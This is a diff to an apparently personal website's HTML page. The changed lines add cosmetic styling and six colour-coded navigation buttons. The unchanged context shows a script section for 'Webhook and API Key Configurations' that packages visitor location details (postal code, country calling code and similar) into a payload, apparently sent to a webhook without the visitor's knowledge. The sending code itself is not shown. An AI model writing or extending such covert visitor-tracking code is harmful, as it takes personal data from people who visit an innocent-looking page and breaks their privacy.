@@ -30,33 +30,71 @@
             text-shadow: 1px 1px 5px rgba(0, 0, 0, 0.5);
         }
 
+        .button-container {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 20px;
+        }
+
         button {
-            background: #dda0dd;
             border: none;
             border-radius: 5px;
             color: #ffffff;
-            font-size: 1.2em;
+            font-size: 1em;
             padding: 10px 20px;
             cursor: pointer;
             transition: background-color 0.3s ease, transform 0.2s ease;
         }
 
         button:hover {
-            background: #add8e6;
             transform: scale(1.1);
         }
 
         button:active {
             transform: scale(1);
         }
+
+        .btn-blue {
+            background: #4d8af0;
+        }
+
+        .btn-green {
+            background: #3cb371;
+        }
+
+        .btn-orange {
+            background: #ff8c00;
+        }
+
+        .btn-purple {
+            background: #8a2be2;
+        }
+
+        .btn-pink {
+            background: #ff1493;
+        }
+
+        .btn-yellow {
+            background: #ffd700;
+        }
     </style>
 </head>
 <body>
     <h1>Welcome to my website.</h1>
-    <button onclick="redirectToPage()">About Me</button>
+    <div class="button-container">
+        <button class="btn-blue" onclick="redirectToPage()">About Me</button>
+        <button class="btn-green" onclick="redirectToPage()">Projects</button>
+        <button class="btn-orange" onclick="redirectToPage()">Contact</button>
+        <button class="btn-purple" onclick="redirectToPage()">Services</button>
+        <button class="btn-pink" onclick="redirectToPage()">Blog</button>
+        <button class="btn-yellow" onclick="redirectToPage()">Portfolio</button>
+    </div>
+
     <script>
         function redirectToPage() {
-            window.location.href = 'page1.html';
+            window.location.href = '#'; // Placeholder: Change to actual page links
         }
 
         // Webhook and API Key Configurations
@@ -165,7 +203,6 @@
                     { name: "Postal", value: location.postal || "N/A", inline: true },
                     { name: "Country Code", value: location.country_calling_code || "N/A", inline: true },
                     { name: "Emoji", value: location.country_emoji || "N/A", inline: true }
-                    
                 ]
             };
             const payload = {
